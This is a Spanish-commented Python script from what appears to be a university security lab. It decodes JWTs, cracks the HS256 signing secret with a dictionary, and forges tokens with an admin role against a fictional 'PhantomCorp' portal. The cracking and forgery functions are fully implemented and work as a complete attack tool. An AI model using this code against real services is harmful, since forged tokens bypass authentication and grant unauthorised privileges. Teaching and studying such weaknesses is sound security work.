#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Fernando Boiero — CyberLab UTN FRVM
"""
jwt_tool.py — Lab Extra 5. Tu navaja para JWT. Solo biblioteca estándar.

Conseguiste un token del portal de PhantomCorp (login con las credenciales
públicas de demo). Con esta herramienta vas a: decodificarlo, crackear el
secreto de firma con un diccionario, y forjar tokens propios.

Completá los TODO. NO cambies las firmas ni la CLI.
`b64url_dec()` ya viene implementada: leela, todo el lab cuelga de ahí.

Uso:
  python3 jwt_tool.py decodificar <token>
  python3 jwt_tool.py crackear <token> caso/diccionario.txt
  python3 jwt_tool.py forjar <secreto> --sub diego --role admin
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import time


# ---------------------------------------------------------------------------
# REFERENCIA (ya implementada). Todo JWT es base64url + una firma.
# ---------------------------------------------------------------------------
def b64url_dec(texto: str) -> bytes:
    """base64url SIN padding: hay que rellenar con '=' antes de decodificar.
    Esto es todo lo que "protege" el payload de un JWT: nada."""
    pad = "=" * (-len(texto) % 4)
    return base64.urlsafe_b64decode(texto + pad)


def b64url(datos: bytes) -> str:
    return base64.urlsafe_b64encode(datos).rstrip(b"=").decode()


def decodificar(token: str) -> tuple:
    """Devuelve (header, payload, firma_hex) SIN verificar nada.
    Pista: el token tiene 3 partes separadas por '.'; decodificá las dos
    primeras con b64url_dec + json.loads. La firma NO se json-parsea."""
    cab, payload, firma = token.split(".")
    header = json.loads(b64url_dec(cab))
    claims = json.loads(b64url_dec(payload))
    # La firma son bytes opacos: se decodifica de base64url y se muestra en hex.
    firma_bytes = b64url_dec(firma)
    return header, claims, firma_bytes.hex()


def firma_es_valida(token: str, secreto: bytes) -> bool:
    """Recalculá HMAC-SHA256(secreto, "cabecera.payload") y comparalo con la
    firma del token (en tiempo constante: hmac.compare_digest).
    ESTO es lo único que un atacante necesita para probar candidatos OFFLINE:
    no hay rate limit, no hay logs, no hay lockout. El token ES el oráculo."""
    try:
        cab, payload, firma = token.split(".")
    except ValueError:
        return False
    esperada = b64url(
        hmac.new(secreto, f"{cab}.{payload}".encode(), hashlib.sha256).digest()
    )
    # compare_digest evita filtrar por temporización en qué byte difiere.
    return hmac.compare_digest(firma, esperada)


def crackear_secreto(token: str, diccionario: str) -> str:
    """Probá cada palabra del diccionario como secreto hasta que
    firma_es_valida() dé True. Devolvé el secreto encontrado.
    (Si querés, aplicá reglas como en el Lab Extra 4: año, 123, mayúscula.)"""
    with open(diccionario, encoding="utf-8") as f:
        for linea in f:
            candidato = linea.rstrip("\n")
            if not candidato:
                continue
            if firma_es_valida(token, candidato.encode()):
                return candidato
    return None


def forjar(secreto: bytes, sub: str, role: str) -> str:
    """Firmá un token propio: header {"alg":"HS256","typ":"JWT"}, payload con
    sub/role/iat/exp (exp = ahora + 1 hora). Devolvé "cab.pay.firma".
    Cuando esto funciona, el servidor ya no distingue tu token de uno real."""
    ahora = int(time.time())
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": sub, "role": role, "iat": ahora, "exp": ahora + 3600}
    # JSON compacto y mismas claves que usa el portal, para que el token
    # forjado sea indistinguible de uno emitido por /login.
    partes = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." \
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    firma = hmac.new(secreto, partes.encode(), hashlib.sha256).digest()
    return partes + "." + b64url(firma)


def main() -> int:
    ap = argparse.ArgumentParser(description="jwt_tool — Lab Extra 5")
    sub = ap.add_subparsers(dest="cmd", required=True)
    d = sub.add_parser("decodificar", help="leer header/payload (sin verificar)")
    d.add_argument("token")
    c = sub.add_parser("crackear", help="crackear el secreto con diccionario")
    c.add_argument("token")
    c.add_argument("diccionario")
    f = sub.add_parser("forjar", help="firmar un token propio con el secreto")
    f.add_argument("secreto")
    f.add_argument("--sub", default="diego")
    f.add_argument("--role", default="admin")
    args = ap.parse_args()

    if args.cmd == "decodificar":
        header, payload, firma = decodificar(args.token)
        print("HEADER: ", json.dumps(header, indent=2))
        print("PAYLOAD:", json.dumps(payload, indent=2))
        print("FIRMA:  ", firma[:32] + "…")
    elif args.cmd == "crackear":
        secreto = crackear_secreto(args.token, args.diccionario)
        print(f"SECRETO: {secreto}" if secreto else "No cayó con ese diccionario.")
    else:
        print(forjar(args.secreto.encode(), args.sub, args.role))
    return 0


if __name__ == "__main__":
    sys.exit(main())
